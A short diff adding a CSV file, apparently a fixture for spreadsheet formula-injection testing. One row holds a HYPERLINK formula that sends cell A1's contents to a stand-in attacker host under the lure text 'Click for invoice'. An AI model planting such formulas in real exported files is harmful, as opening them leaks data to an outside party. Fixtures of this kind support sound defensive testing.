@@ -1,0 +1,3 @@
+Header,Link
+Foo,=HYPERLINK("https://evil.example.com/steal?u="&A1,"Click for invoice")
+Bar,=A1+B1
